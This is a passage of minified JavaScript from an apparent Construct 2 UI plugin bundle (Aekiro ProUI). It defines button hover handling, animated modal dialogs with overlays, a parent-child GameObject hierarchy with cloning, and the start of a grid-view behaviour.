t,e,i=!0,s=this.proui.scrollViews["l"+this.inst.layer.index];return s&&(e=this.runtime.isMobile?(t=this.proui.X(this.inst.layer.index),this.proui.Y(this.inst.layer.index)):(t=this.proui.CursorX(this.inst.layer.index),this.proui.CursorY(this.inst.layer.index)),s.inst.update_bbox(),i=s.inst.contains_pt(t,e)),i},e.isClickable=function(){for(var t=this.inst.layer.visible&&this.inst.visible,e=!1,i=0,s=this.proui.currentDialogs.length;i<s;i++)if(this.inst.layer.index<this.proui.currentDialogs[i].inst.layer.index){e=!0;break}return t&&this.isEnabled&&!e},e.tick=function(){var t;this.firstFrame&&(this.firstFrame=!1,this.inst.cur_anim_speed=0,this.firstSetValue||this.updateFromModel(),this.updateView(),this.lastY=this.proui.CursorY(this.inst.layer.index),this.lastX=this.proui.CursorX(this.inst.layer.index)),this.tween.isPlaying&&(t=1e3*this.runtime.getDt(this.inst),this.tween.update(t),this.inst.set_bbox_changed()),this.tween_hover.isPlaying&&(t=1e3*this.runtime.getDt(this.inst),this.tween_hover.update(t),this.inst.set_bbox_changed()),this.isClickable()&&(this.isMouseOver()&&this.isInsideScrollView()?!this.onMouseEnterFlag&&(10<Math.abs(this.lastY-this.proui.CursorY(this.inst.layer.index))||10<Math.abs(this.lastX-this.proui.CursorX(this.inst.layer.index)))&&(this.onMouseEnterFlag=!0,this.OnMouseEnter(),this.lastY=this.proui.CursorY(this.inst.layer.index),this.lastX=this.proui.CursorX(this.inst.layer.index)):this.onMouseEnterFlag&&(!this.isInsideScrollView()||10<Math.abs(this.lastY-this.proui.CursorY(this.inst.layer.index))||10<Math.abs(this.lastX-this.proui.CursorX(this.inst.layer.index)))&&(this.onMouseEnterFlag=!1,this.OnMouseLeave(),this.lastY=this.proui.CursorY(this.inst.layer.index),this.lastX=this.proui.CursorX(this.inst.layer.index)))},e.onDestroy=function(){},e.saveToJSON=function(){return{isEnabled:this.isEnabled,clickSound:this.clickSound,clickAnimation:this.clickAnimation,hoverSound:this.hoverSound,hoverAnimation:this.hoverAnimation,callbackName:this.callbackName,callbackParams:this.callbackParams,frames_normal:this.frames_normal,frames_hover:this.frames_hover,disabledFrames:this.frames_disabled,value:this.value}},e.loadFromJSON=function(t){this.isEnabled=t.isEnabled,this.clickSound=t.clickSound,this.clickAnimation=t.clickAnimation,this.hoverSound=t.hoverSound,this.hoverAnimation=t.hoverAnimation,this.callbackName=t.callbackName,this.callbackParams=t.callbackParams,this.frames_normal=t.frames_normal,this.frames_hover=t.frames_hover,this.frames_disabled=t.disabledFrames,this.value=t.value,this.onCreateInit()},i.prototype.OnMouseEnter=function(){return!0},i.prototype.OnMouseLeave=function(){return!0},i.prototype.IsEnabled=function(){return this.isEnabled},i.prototype.OnClicked=function(){return!0},i.prototype.IsChecked=function(){return this.value},t.cnds=new i,s.prototype.setEnabled=function(t){this.setEnabled(t)},s.prototype.setValue=function(t){this.setValue(t)},t.acts=new s,n.prototype.value=function(t){t.set_int(this.value)},t.exps=new n}(),cr.behaviors.aekiro_dialog=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_dialog.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){if(this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.");this.tweenFunctions=[TWEEN.Easing.Linear.None,TWEEN.Easing.Quadratic.Out,TWEEN.Easing.Quartic.Out,TWEEN.Easing.Exponential.Out,TWEEN.Easing.Circular.Out,TWEEN.Easing.Back.Out,TWEEN.Easing.Elastic.Out,TWEEN.Easing.Bounce.Out]};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){this.proui=cr.proui,this.proui.isTypeValid(this.inst,[cr.plugins_.Sprite,cr.plugins_.NinePatch,cr.plugins_.TiledBg],"Pro UI: dialog behavior is only applicable to Sprite, 9-patch or tiled backgrounds objects."),this.openAnimation=this.properties[0],this.openAnimTweenFunction=this.tweenFunctions[this.properties[1]],this.openSound=this.properties[2],this.openAnimDuration=this.properties[3],this.closeAnimation=this.properties[4],this.closeAnimTweenFunction=this.tweenFunctions[this.properties[5]],this.closeSound=this.properties[6],this.closeAnimDuration=this.properties[7],this.overlayUID=this.properties[8],this.pauseOnOpen=this.properties[9],this.closeButtonUID=this.properties[10],this.isModal=this.properties[11],this.isLayerContainer=this.properties[12],this.firstFrame=!0,this.inst.uiType="dialog",this.uiType="dialog",(this.inst._proui=this).dpos={},this.isInit=!1,this.isOpen=!1,this.outLayerChildren={},this.tween=new TWEEN.Tween,this.tween.onReverseComplete(this.postClose,this),this.tween.onComplete(this.postOpen,this),this.tween_close=new TWEEN.Tween,this.tween_close.onComplete(this.postClose,this),this.tween_opacity=new TWEEN.Tween},e.setCloseButton=function(){var t;this.closeButton=this.proui.tags[this.closeButtonUID],this.closeButton&&("button"==this.closeButton.uiType?(t=this).closeButton._proui.callbacks.push(function(){t.close()}):console.error("ProUI-Dialog uid=%s: the close button needs to have a button behavior !",this.inst.uid))},e.setOverlay=function(){this.overlay=this.proui.tags[this.overlayUID],this.overlay&&(this.proui.isTypeValid(this.overlay,[cr.plugins_.Sprite,cr.plugins_.NinePatch,cr.plugins_.TiledBg],"ProUI-Dialog: The overlay of a dialog can only be a Sprite, 9-patch Or Tiled Background object."),this.overlay.uiType="overlay",this.tween_overlay=new TWEEN.Tween,this.tween_overlay.easing(TWEEN.Easing.Quartic.Out))},e.showOverlay=function(){this.overlay&&(this.overlay.my_timescale=1,this.overlay.type.plugin.acts.MoveToLayer.call(this.overlay,this.inst.layer),this.overlay.type.plugin.acts.MoveToBottom.call(this.overlay),this.overlay.width=this.inst.layer.viewRight-this.inst.layer.viewLeft,this.overlay.height=this.inst.layer.viewBottom-this.inst.layer.viewTop,this.overlay.set_bbox_changed(),this.overlay.update_bbox(),this.overlay.x=this.inst.layer.viewLeft+(this.overlay.x-this.overlay.bbox.left),this.overlay.y=this.inst.layer.viewTop+(this.overlay.y-this.overlay.bbox.top),this.overlay.set_bbox_changed(),this.overlay.visible=!0,this.overlay.opacity=0,this.tween_overlay.setObject(this.overlay),this.tween_overlay.to({opacity:.3},300),this.tween_overlay.start())},e.setDialogTimeScale=function(){for(var t=0,e=this.inst.layer.instances.length;t<e;t++)this.inst.layer.instances[t].my_timescale=1},e.setOutLayerChildrenVisible=function(s){var n,r=this;Object.keys(this.outLayerChildren).forEach(function(t){for(var e=0,i=(n=r.outLayerChildren[t]).length;e<i;e++)cr.system_object.prototype.acts.SetLayerVisible.call(r.runtime.system,n[e].layer,s)})},e.init=function(){this.isInit||(cr.system_object.prototype.acts.SetLayerVisible.call(this.runtime.system,this.inst.layer,!1),this.setOutLayerChildrenVisible(!1),this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y,this.dpos.dx=0,this.dpos.dy=0,this.inst.x=this.inst.layer.viewLeft-this.inst.width-100,this.inst.set_bbox_changed(),this.setOverlay(),this.setCloseButton(),this.isInit=!0)},e.tick=function(){var t,s,n;this.firstFrame&&(this.firstFrame=!1,this.init()),this.tween.isPlaying&&(t=1e3*this.runtime.getDt(this.inst),this.tween.update(t),5==this.openAnimation||6==this.openAnimation?(n=this,Object.keys(this.outLayerChildren).forEach(function(t){for(var e=0,i=(s=n.outLayerChildren[t]).length;e<i;e++)s[e].layer.scale=n.inst.layer.scale}),this.runtime.redraw=!0):this.inst.set_bbox_changed()),this.tween_close.isPlaying&&(t=1e3*this.runtime.getDt(this.inst),this.tween_close.update(t),6==this.closeAnimation||7==this.closeAnimation?(n=this,Object.keys(this.outLayerChildren).forEach(function(t){for(var e=0,i=(s=n.outLayerChildren[t]).length;e<i;e++)s[e].layer.scale=n.inst.layer.scale}),this.runtime.redraw=!0):this.inst.set_bbox_changed()),this.tween_opacity.isPlaying&&(t=1e3*this.runtime.getDt(this.inst),this.tween_opacity.update(t),n=this,Object.keys(this.outLayerChildren).forEach(function(t){for(var e=0,i=(s=n.outLayerChildren[t]).length;e<i;e++)s[e].layer.opacity=n.inst.layer.opacity}),this.runtime.redraw=!0),this.tween_overlay&&this.tween_overlay.isPlaying&&(t=1e3*this.runtime.getDt(this.inst),this.tween_overlay.update(t),this.runtime.redraw=!0)},e.updateChildren=function(){var n;if(this.isLayerContainer&&(isNaN(this.dpos.prev_x)&&(this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y),this.dpos.dx=this.inst.x-this.dpos.prev_x,this.dpos.dy=this.inst.y-this.dpos.prev_y,this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y,0!=this.dpos.dx||0!=this.dpos.dy)){for(var r,t=0,e=this.inst.layer.instances.length;t<e;t++)"dialog"!=(n=this.inst.layer.instances[t]).uiType&&"overlay"!=n.uiType&&!0!==n.isSubComp&&(n.x+=this.dpos.dx,n.y+=this.dpos.dy,n.set_bbox_changed(),"radiogroup"!=n.uiType&&"discreteProgress"!=n.uiType&&"sliderbar"!=n.uiType||n._proui.updateChildren());var o=this;Object.keys(this.outLayerChildren).forEach(function(t,e){for(var i=0,s=(r=o.outLayerChildren[t]).length;i<s;i++)(n=r[i]).x+=o.dpos.dx,n.y+=o.dpos.dy,n.set_bbox_changed()})}},e.tick2=function(){this.updateChildren()},e.setInitialPosition=function(t,e,i){var s,n;0==this.openAnimation||5==this.openAnimation||6==this.openAnimation?(s=t,n=e,i&&(n=(this.inst.layer.viewTop+this.inst.layer.viewBottom)/2,s=(this.inst.layer.viewLeft+this.inst.layer.viewRight)/2)):1==this.openAnimation?(n=this.inst.layer.viewTop-this.inst.height/2-100,s=i?(this.inst.layer.viewLeft+this.inst.layer.viewRight)/2:t):2==this.openAnimation?(n=this.inst.layer.viewBottom+this.inst.height/2+100,s=i?(this.inst.layer.viewLeft+this.inst.layer.viewRight)/2:t):3==this.openAnimation?(s=this.inst.layer.viewRight+this.inst.width/2+100,n=i?(this.inst.layer.viewTop+this.inst.layer.viewBottom)/2:e):4==this.openAnimation&&(s=this.inst.layer.viewLeft-this.inst.width/2-100,n=i?(this.inst.layer.viewTop+this.inst.layer.viewBottom)/2:e),this.inst.x=s,this.inst.y=n,this.inst.set_bbox_changed(),this.updateChildren()},e.open=function(t,e,i){var s,n;this.init(),this.isOpen||this.tween.isPlaying||(this.proui.isModalDialogOpened()?console.log("ProUI-Dialog: Can not open dialog because modal dialog is already opened"):(this.tween_close.isPlaying&&(this.tween_close.isPlaying=!1,this.postClose()),this.proui.addDialog(this),this.isOpen=!0,this.runtime.trigger(cr.behaviors.aekiro_dialog.prototype.cnds.onDialogOpened,this.inst),this.pauseOnOpen&&(this.prevTimescale=this.runtime.timescale,cr.system_object.prototype.acts.SetTimescale.call(this.runtime.system,0)),1!=this.runtime.timescale&&this.setDialogTimeScale(1),this.setInitialPosition(t,e,i),cr.system_object.prototype.acts.SetLayerVisible.call(this.runtime.system,this.inst.layer,!0),n=this,Object.keys(this.outLayerChildren).forEach(function(t){for(var e=0,i=(s=n.outLayerChildren[t]).length;e<i;e++)cr.system_object.prototype.acts.SetLayerVisible.call(n.runtime.system,s[e].layer,!0)}),t=t,e=e,i&&(t=(this.inst.layer.viewLeft+this.inst.layer.viewRight)/2,e=(this.inst.layer.viewTop+this.inst.layer.viewBottom)/2),0==this.openAnimDuration&&(this.openAnimation=0),1==this.openAnimation||2==this.openAnimation?(this.tween.setObject(this.inst),this.tween.easing(this.openAnimTweenFunction),this.tween.to({y:e},this.openAnimDuration)):3==this.openAnimation||4==this.openAnimation?(this.tween.setObject(this.inst),this.tween.easing(this.openAnimTweenFunction),this.tween.to({x:t},this.openAnimDuration)):5!=this.openAnimation&&6!=this.openAnimation||(this.tween.setObject(this.inst.layer),this.tween.easing(this.openAnimTweenFunction),5==this.openAnimation?this.inst.layer.scale=2:this.inst.layer.scale=.2,this.inst.layer.opacity=0,this.runtime.redraw=!0,this.tween.to({scale:1},this.openAnimDuration),this.tween_opacity.setObject(this.inst.layer),this.tween_opacity.to({opacity:1},300),this.tween_opacity.easing(TWEEN.Easing.Quartic.Out)),0<this.openAnimation?(this.tween.start(),5!=this.openAnimation&&6!=this.openAnimation||this.tween_opacity.start()):(this.inst.x=t,this.inst.y=e,this.inst.set_bbox_changed(),this.updateChildren()),this.openSound&&this.proui.playAudio(this.openSound)))},e.postOpen=function(){this.showOverlay()},e.getCloseTargetPosition=function(){var t=this.inst.x,e=this.inst.y;return 2==this.closeAnimation?(e=this.inst.layer.viewBottom+this.inst.height/2+100,t=this.inst.x):3==this.closeAnimation?(e=this.inst.layer.viewTop-this.inst.height/2-100,t=this.inst.x):4==this.closeAnimation?(t=this.inst.layer.viewLeft-this.inst.width/2-100,e=this.inst.y):5==this.closeAnimation&&(t=this.inst.layer.viewRight+this.inst.width/2+100,e=this.inst.y),{x:t,y:e}},e.close=function(){var t,e;!this.isOpen||this.tween.isPlaying||this.tween_close.isPlaying||(this.isOpen=!1,this.runtime.trigger(cr.behaviors.aekiro_dialog.prototype.cnds.onDialogClosed,this.inst),this.overlay&&(this.overlay.visible=!1),this.proui.removeDialog(this),t=(e=this.getCloseTargetPosition()).x,e=e.y,0==this.closeAnimDuration&&(this.closeAnimation=0),2==this.closeAnimation||3==this.closeAnimation?(this.tween_close.setObject(this.inst),this.tween_close.easing(this.closeAnimTweenFunction),this.tween_close.to({y:e},this.closeAnimDuration)):4==this.closeAnimation||5==this.closeAnimation?(this.tween_close.setObject(this.inst),this.tween_close.easing(this.closeAnimTweenFunction),this.tween_close.to({x:t},this.closeAnimDuration)):6!=this.closeAnimation&&7!=this.closeAnimation||(this.tween_close.setObject(this.inst.layer),this.tween_close.easing(this.closeAnimTweenFunction),6==this.closeAnimation?this.tween_close.to({scale:.2},this.closeAnimDuration):this.tween_close.to({scale:2},this.closeAnimDuration),this.tween_opacity.setObject(this.inst.layer),this.tween_opacity.to({opacity:0},300),this.tween_opacity.easing(TWEEN.Easing.Quartic.Out)),1==this.closeAnimation?(this.tween.reverse(),5!=this.openAnimation&&6!=this.openAnimation||this.tween_opacity.reverse()):0==this.closeAnimation?this.postClose():(this.tween_close.start(),6!=this.closeAnimation&&7!=this.closeAnimation||this.tween_opacity.start()),this.closeSound&&this.proui.playAudio(this.closeSound))},e.postClose=function(){cr.system_object.prototype.acts.SetLayerVisible.call(this.runtime.system,this.inst.layer,!1);var s,n=this;Object.keys(this.outLayerChildren).forEach(function(t){for(var e=0,i=(s=n.outLayerChildren[t]).length;e<i;e++)cr.system_object.prototype.acts.SetLayerVisible.call(n.runtime.system,s[e].layer,!1)}),this.inst.layer.scale=1,this.inst.layer.opacity=1,this.runtime.redraw=!0;var t=(this.inst.layer.viewLeft+this.inst.layer.viewRight)/2,e=this.inst.layer.viewTop-this.inst.height/2-100;this.inst.x=t,this.inst.y=e,this.inst.set_bbox_changed(),this.updateChildren(),this.pauseOnOpen&&cr.system_object.prototype.acts.SetTimescale.call(this.runtime.system,this.prevTimescale),0!=this.runtime.timescale&&this.setDialogTimeScale(-1)},e.onDestroy=function(){this.proui.removeDialog(this)},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){},i.prototype.onDialogOpened=function(){return!0},i.prototype.onDialogClosed=function(){return!0},i.prototype.isOpened=function(){return this.isOpen},t.cnds=new i,s.prototype.Open=function(t,e,i){this.open(t,e,i)},s.prototype.Close=function(){this.close()},t.acts=new s,t.exps=new function(){}}(),cr.behaviors.aekiro_gameobject2=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_gameobject2.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){var n;this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,cr.goManager||(n=this.runtime,cr.goManager={gos:{},toBeDestroyed:[],addGO:function(t){var e;t&&(t.aekiro_gameobject2.name||(t.aekiro_gameobject2.name="o"+t.uid),e=t.aekiro_gameobject2.name,this.gos.hasOwnProperty(e)?console.error("Aekiro Hierarchy: GameObject already exist with name: %s !",e):this.gos[e]=t)},removeGO:function(t){delete this.gos[t]},clearDestroyList:function(){for(var t=this.toBeDestroyed,e=0,i=t.length;e<i;e++)n.DestroyInstance(t[e]);t.length=0},createInst:function(t,e,i,s){e="number"==typeof e?this.runtime.getLayerByNumber(e):"string"==typeof e?this.runtime.getLayerByName(e):e;return n.createInstance(t,e)},clone:function(t,e,i,s,n){cr.haltNext=!0;var r=this.createInst(t.parent.type,i);cr.haltNext=!1,r.type.plugin.acts.LoadFromJsonString.call(r,t.parent.json),r.x=s,r.y=n,r.set_bbox_changed(),r.update_bbox(),r.aekiro_gameobject2.name="",r.aekiro_gameobject2.onCreateInit(),e&&(r.aekiro_gameobject2.parentName=e.aekiro_gameobject2.name);for(var o=0,a=t.children.length;o<a;o++)this.clone(t.children[o],r,i,r.bbox.left+t.children[o].parent.relX,r.bbox.top+t.children[o].parent.relY);return r.aekiro_gameobject2.init(),r}})};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.goManager=cr.goManager,this.name=this.properties[0],this.parentName=this.properties[1],this.firstFrame=!0,(this.inst.aekiro_gameobject2=this).isInit=!1,this.areChildrenRegistred=!1,this.children=[],cr.haltNext||this.onCreateInit()},e.onCreateInit=function(){this.goManager.addGO(this.inst),this.local={x:0,y:0,angle:0},this.inst.update_bbox(),this.prev={x:this.inst.x,y:this.inst.y,angle:this.inst.angle,width:this.inst.width,height:this.inst.height};var t=this.inst.set_bbox_changed;this.inst.set_bbox_changed_old=this.inst.set_bbox_changed,this.inst.set_bbox_changed=function(){this.aekiro_gameobject2.local_update(),this.aekiro_gameobject2.children_update(),t.call(this)}},e.local_update=function(){var t;this.parent=this.parent_get(),this.parent&&(t=this.globalToLocal(this.inst,this.parent),this.local.x=t.x,this.local.y=t.y,this.local.angle=t.angle)},e.local_set=function(t,e,i){var s;this.parent=this.parent_get(),this.parent&&(s=this.inst,null!=t&&(this.local.x=t),null!=e&&(this.local.y=e),null!=i&&(this.local.angle=i),s.x=this.parent.x+this.local.x*Math.cos(this.parent.angle)-this.local.y*Math.sin(this.parent.angle),s.y=this.parent.y+this.local.x*Math.sin(this.parent.angle)+this.local.y*Math.cos(this.parent.angle),s.angle=this.parent.angle+this.local.angle,this.prev.x=s.x,this.prev.y=s.y,this.prev.angle=s.angle,this.children_update(),this.inst.set_bbox_changed_old())},e.children_add=function(t){var e,i,s;if("string"==typeof t)e=t,t=null;else{if(!(i=t.aekiro_gameobject2))return void console.error("Aekiro GameObject: You're adding a child (uid=%s) without a gameobject behavior on it.",t.uid);e=t.aekiro_gameobject2.name}(t=this.goManager.gos[e])?e!=this.parentName?-1<this.children.indexOf(t)?console.error("Aekiro GameObject: Object %s already have a child named %s !",this.name,e):((i=t.aekiro_gameobject2).removeFromParent(),i.parentName=this.name,s=this.globalToLocal2(t,this.prev.x,this.prev.y,this.prev.angle),i.local.x=s.x,i.local.y=s.y,i.local.angle=s.angle,this.children.push(t)):console.error("Aekiro GameObject: Cannot add %s as a child of %s, because %s is its parent !",e,this.name,e):console.error("Aekiro GameObject: Object of name : %s not found !",e)},e.children_remove=function(t){var e=-1;if("string"==typeof t){for(var i=0,s=this.children.length;i<s;i++)if(this.children[i].aekiro_gameobject2.name==t){e=i;break}}else e=this.children.indexOf(t);-1!=e&&(this.children[e].aekiro_gameobject2.parentName="",this.children[e].aekiro_gameobject2.parent=null,this.children.splice(e,1))},e.children_update=function(){if(this.areChildrenRegistred||this.registerChildren(),this.prev.x=this.inst.x,this.prev.y=this.inst.y,this.prev.angle=this.inst.angle,this.children.length){var t=this.inst;t.width=0==t.width?.1:t.width,t.height=0==t.height?.1:t.height;var e=t.width/this.prev.width,i=t.height/this.prev.height;this.prev.width=t.width,this.prev.height=t.height;this.goManager;for(var s,n=0,r=this.children.length;n<r;n++)s=this.children[n],1!=e&&(s.width*=e,s.aekiro_gameobject2.local.x*=e),1!=i&&(s.height*=i,s.aekiro_gameobject2.local.y*=i),s.x=t.x+s.aekiro_gameobject2.local.x*Math.cos(t.angle)-s.aekiro_gameobject2.local.y*Math.sin(t.angle),s.y=t.y+s.aekiro_gameobject2.local.x*Math.sin(t.angle)+s.aekiro_gameobject2.local.y*Math.cos(t.angle),s.angle=t.angle+s.aekiro_gameobject2.local.angle,s.aekiro_gameobject2.prev.x=s.x,s.aekiro_gameobject2.prev.y=s.y,s.aekiro_gameobject2.prev.angle=s.angle,s.set_bbox_changed_old(),s.aekiro_gameobject2.children_update()}},e.scopeToParent=function(t,e){var i={};return i.x=e.x+t.x*Math.cos(e.angle)-t.y*Math.sin(e.angle),i.y=e.y+t.x*Math.sin(e.angle)+t.y*Math.cos(e.angle),i.angle=e.angle+t.angle,i},e.localToGlobal=function(){let t=this.parent_get();var e=this.local,i={};if(!t)return{x:this.inst.x,y:this.inst.y,angle:this.inst.angle};for(;t;)i.x=t.x+e.x*Math.cos(t.angle)-e.y*Math.sin(t.angle),i.y=t.y+e.x*Math.sin(t.angle)+e.y*Math.cos(t.angle),i.angle=t.angle+e.angle,e={x:i.x,y:i.y,angle:i.angle},t=t.aekiro_gameobject2.parent_get();return i},e.globalToLocal=function(t,e){var i={};return i.x=(t.x-e.x)*Math.cos(e.angle)+(t.y-e.y)*Math.sin(e.angle),i.y=-(t.x-e.x)*Math.sin(e.angle)+(t.y-e.y)*Math.cos(e.angle),i.angle=t.angle-e.angle,i},e.globalToLocal2=function(t,e,i,s){var n={};return n.x=(t.x-e)*Math.cos(s)+(t.y-i)*Math.sin(s),n.y=-(t.x-e)*Math.sin(s)+(t.y-i)*Math.cos(s),n.angle=t.angle-s,n},e.registerChildren=function(){var e,i,s;this.areChildrenRegistred||(e=this.goManager.gos,(s=this).name&&Object.keys(e).forEach(function(t){(i=e[t]).aekiro_gameobject2.parentName==s.name&&(s.children_add(i),i.aekiro_gameobject2.registerChildren())}),this.areChildrenRegistred=!0,console.log("registerChildren"))},e.init=function(){this.isInit||(this.registerChildren(),this.children_update(),this.isInit=!0,this.setVisible(this.inst.visible))},e.tick=function(){this.firstFrame&&(this.firstFrame=!1,this.init())},e.tick2=function(){},e.setVisible=function(t){this.init(),this.inst.type.plugin.acts.SetVisible.call(this.inst,t);for(var e=this.children,i=0,s=e.length;i<s;i++)e[i].aekiro_gameobject2.setVisible(t)},e.setOpacity=function(t){this.init(),this.inst.type.plugin.acts.SetOpacity.call(this.inst,t);for(var e=this.children,i=0,s=e.length;i<s;i++)e[i].aekiro_gameobject2.setOpacity(t)},e.getTemplate=function(t,e,i){this.init(),t=t||this.inst,i=i||[],e&&e.update_bbox(),i.push({parent:{type:t.type,relX:e?t.x-e.bbox.left:null,relY:e?t.y-e.bbox.top:null,json:JSON.stringify(this.runtime.saveInstanceToJSON(t,!0))},children:[]});for(var s=t.aekiro_gameobject2.children,n=0,r=s.length;n<r;n++)this.getTemplate(s[n],t,i[i.length-1].children);return i[0]},e.parent_get=function(){return!this.parent&&this.parentName&&this.name&&(this.parent=this.goManager.gos[this.parentName]),this.parent},e.removeFromParent=function(){this.parent=this.parent_get(),this.parent&&this.parent.aekiro_gameobject2.children_remove(this.inst)},e.onDestroy=function(){var t=this.goManager;if(!this.runtime.changelayout){for(var e=0,i=this.children.length;e<i;e++)t.toBeDestroyed.push(this.children[e]);setTimeout(function(){t.clearDestroyList()},0)}this.children.length=0,t.removeGO(this.name),this.inst.set_bbox_changed=this.inst.set_bbox_changed_old,this.removeFromParent()},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){},i.prototype.IsName=function(t){return t==this.name},i.prototype.IsParent=function(t){return t==this.parentName},i.prototype.OnCloned=function(){return!0},t.cnds=new i,s.prototype.Clone=function(t,e,i){var s=this.getTemplate(this.inst),i=this.goManager.clone(s,null,t,e,i);this.runtime.trigger(cr.behaviors.aekiro_gameobject2.prototype.cnds.OnCloned,i)},s.prototype.SetVisible=function(t){this.setVisible(t)},s.prototype.SetOpacity=function(t){this.setOpacity(t)},s.prototype.AddChildrenFromLayer=function(t){this.init();for(var e="number"==typeof t?this.runtime.getLayerByNumber(t):"string"==typeof t?this.runtime.getLayerByName(t):t,i=0,s=e.instances.length;i<s;i++)this.children_add(e.instances[i])},s.prototype.AddChildrenFromType=function(t){if(t)for(var e=t.getCurrentSol().getObjects(),i=0,s=e.length;i<s;i++)this.children_add(e[i])},s.prototype.AddChildByName=function(t){this.children_add(t)},s.prototype.SetLocalPosition=function(t,e){this.local_set(t,e)},s.prototype.SetLocal=function(t,e){0==t?this.local_set(e):1==t?this.local_set(null,e):2==t&&this.local_set(null,null,e)},s.prototype.RemoveChildByName=function(t){this.children_remove(t)},s.prototype.RemoveChildByType=function(t){if(t)for(var e=t.getCurrentSol().getObjects(),i=0,s=e.length;i<s;i++)this.children_remove(e[i])},s.prototype.RemoveFromParent=function(){this.removeFromParent()},t.acts=new s,n.prototype.name=function(t){t.set_string(this.name)},n.prototype.parent=function(t){t.set_string(this.parentName)},n.prototype.local=function(t,e){this.parent_get()?"x"==e?t.set_float(this.local.x):"y"==e?t.set_float(this.local.y):"angle"==e?t.set_float(this.local.angle):t.set_float(0):t.set_float(0)},n.prototype.global=function(t,e){var i;this.parent_get()?(i=this.localToGlobal(),"x"===e?t.set_float(i.x):"y"===e?t.set_float(i.y):"angle"===e?t.set_float(i.angle):t.set_float(0)):"x"===e?t.set_float(this.inst.x):"y"===e?t.set_float(this.inst.y):"angle"===e?t.set_float(this.inst.angle):t.set_float(0)},t.exps=new n}(),cr.behaviors.aekiro_gridView=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_gridView.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){if(this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.")};var e=t.Instance.prototype;e.onCreate=function(){this.proui=cr.proui,this.proui.isTypeValid(this.inst,[cr.plugins_.Sprite,cr.plugins_.NinePatch,cr.plugins_.TiledBg],"ProUI-GRIDVIEW: GridView behavior is only applicable to Sprite Or 9-patch objects."),this.itemUID=this.properties[0],this.columns=this.properties[1],this.rows=this.properties[2],this.vspace=this.properties[3],this.hspace=this.properties[4],this.VPadding=this.properties[5],this.HPadding=this.properties[6],this.dialogUID=this.properties[7],this.firstFrame=!0,this.inst.uiType="gridView",this.uiType="gridView",(this.inst._proui=this).dpos={},this.template={},this.isTemplateSet=!1,this.value=[],this.items=[],this.isViewBuilt=!1,this.it_column=0,this.it_row=0,this.firstUpdateView=!1,this.scrollView=null,this.isScrollViewInit=!1,this.triggerRenderTickCt=0,this.triggerRenderTickMax=4},e.updateFromModel=function(){var t,e=this.inst.proui_model;!e||null!=(t=e.getFromModel())&&(i(t)?this.value=t:console.error("ProUI-GRIDVIEW: The value at the key %s of the model of uid= %s, is not an array !",e.modelKey,e.modelUID))},e._setValue=function(t,e){null==t&&(t=[]),i(t)?(this.value=t,this.updateView(e)):(e=this.inst.proui_model,console.error("ProUI-GRIDVIEW: The value at the key %s of the model of uid= %s, is not an array !",e.modelKey,e.modelUID))},e.setItemTemplate=function(){if(!this.isTemplateSet){this.setTemplateVisible(!0);var t,e,i=this.proui.tags[this.itemUID];if(!i)throw new Error("ProUI-GRIDVIEW: Grid item not found, please check gridItem uid");this.proui.isTypeValid(i,[cr.plugins_.Sprite,cr.plugins_.NinePatch,cr.plugins_.TiledBg],"ProUI-GRIDVIEW: Grid item can only be a Sprite Or 9-patch object."),i.uiType="gridItem",i.update_bbox(),this.template.item={},this.template.item.type=i.type,this.template.item.width=i.width,this.template.item.height=i.height,this.template.item.uiType="gridItem",this.template.item.offsetX=i.x-i.bbox.left,this.template.item.offsetY=i.y-i.bbox.top,this.template.item.json=JSON.stringify(this.runtime.saveInstanceToJSON(i,!0)),this.template.subs=[];for(var s=0,n=this.inst.layer.instances.length;s<n;s++)"discreteProgress"!=(t=this.inst.layer.instances[s]).uiType&&"sliderbar"!=t.uiType&&"progress"!=t.uiType&&"scrollView"!=t.uiType||t._proui.init();for(s=0,n=this.inst.layer.instances.length;s<n;s++)"gridView"!=(t=this.inst.layer.instances[s]).uiType&&"gridItem"!=t.uiType&&"dialog"!=t.uiType&&"scrollView"!=t.uiType&&"radiobutton"!=t.uiType&&"scrollBar"!=t.uiType&&"slider"!=t.uiType&&!0!==t.isSubComp&&(e=null,"radiogroup"!=t.uiType&&"discreteProgress"!=t.uiType&&"sliderbar"!=t.uiType||(e=t._proui.getTemplate()),this.template.subs.push({type:t.type,relX:t.x-i.bbox.left,relY:t.y-i.bbox.top,json:JSON.stringify(this.runtime.saveInstanceToJSON(t,!0)),bindkey:t.proui_bind?t.proui_bind.bind_key:"",template:e}));this.isTemplateSet=!0;for(s=0,n=this.inst.layer.instances.length;s<n;s++)"gridView"!=(t=this.inst.layer.instances[s]).uiType&&"dialog"!=t.uiType&&"scrollView"!=t.uiType&&"radiobutton"!=t.uiType&&"scrollBar"!=t.uiType&&"slider"!=t.uiType&&!0!==t.isSubComp&&this.runtime.DestroyInstance(t)}},e.initScrollView=function(){if(!this.isScrollViewInit)for(var t,e=0,i=this.inst.layer.instances.length;e<i;e++)if("scrollView"==(t=this.inst.layer.instances[e]).uiType)return t._proui.init(),void(this.isScrollViewInit=!0)},e.updateView=function(t){if(this.rows<=0&&this.columns<=0)console.error("ProUI-GRIDVIEW: max rows and max columns can't be both -1 or 0");else{if(this.initScrollView(),this.setItemTemplate(),this.inst.update_bbox(),this.initBboxTop=this.inst.bbox.top,this.initBboxLeft=this.inst.bbox.left,0==this.value.length)this.clear();else 